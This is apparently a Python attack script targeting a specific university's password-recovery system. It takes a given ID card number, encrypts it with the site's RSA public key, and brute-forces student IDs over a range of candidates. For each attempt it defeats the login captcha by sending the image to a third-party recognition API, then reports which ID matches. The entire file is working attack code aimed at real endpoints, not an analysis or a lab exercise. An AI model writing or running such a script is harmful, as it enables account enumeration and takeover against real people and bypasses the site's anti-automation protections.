import requests
import time
import base64
from Crypto.Util.number import bytes_to_long

def get_timestamp():
    return int(time.time() * 1000)

def get_public_key():
    pub = session.get(pub_url, headers=headers).text.strip()
    return pub

def rsa_encrypt(text, modulus_hex, exponent_hex):
    text_bytes = text.encode('utf-8')
    
    m = bytes_to_long(text_bytes)
    
    n = int(modulus_hex, 16)
    e = int(exponent_hex, 16)
    
    c = pow(m, e, n)
    
    return hex(c)[2:].lower()

def get_cap(url, timestamp):
    return session.get(f"{url}?time={timestamp}", headers=headers)


session = requests.Session()
timestamp = get_timestamp()
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0"
}

# 接口地址
login_url = "https://authserver.mju.edu.cn/im/V2/securitycenter/findPwd/byPhone/index.zf"
validate_url = "https://authserver.mju.edu.cn/im/V2/securitycenter/findPwd/valdiateYhmCard.zf"
pub_url = "https://authserver.mju.edu.cn/im/securitycenter/findPwd/getPublicKey.zf"
api_url = "https://api.leepow.com/verifycode"
cap_url = "https://authserver.mju.edu.cn/im/kapt"

# 待爆破信息
idcard = ""# 请输入身份证号

# 初始化Cookie
session.get(login_url, headers=headers)

# 1. 获取公钥
pub = get_public_key()

try:
    Modulus, public_exponent = pub.split(';')
except Exception as e:
    print(f" 公钥获取失败：{pub}，错误：{e}")
    exit()
    
encrypted_idcard = rsa_encrypt(idcard, Modulus, public_exponent)
print(encrypted_idcard)
# 开始爆破
for i in range(10):
    for j in range(10):
        # 3. 获取并识别验证码
        while True:
            timestamp = get_timestamp()
            cap_response = get_cap(cap_url, timestamp)
            img_base64 = base64.b64encode(cap_response.content).decode("utf-8")
            
            # 调用第三方API识别验证码
            res = session.post(
                api_url,
                headers={"Content-Type": "application/json"},
                json={"image": img_base64}
            )

            yzm = res.json()["data"]
            if len(yzm) == 4:
                break

        # 4. 构造学号并提交验证
        username = f"M2{i}2{j}03013" # 爆破学号格式
        res = session.post(
            validate_url,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "username": username,
                "idCard": encrypted_idcard,
                "yzm": yzm,
                "findType": "byPhone"
            }
        )
        
        # 5. 输出结果
        if "true" in res.text:
            print(f"学号({username}), 验证码({yzm}), 结果({res.text})")
            break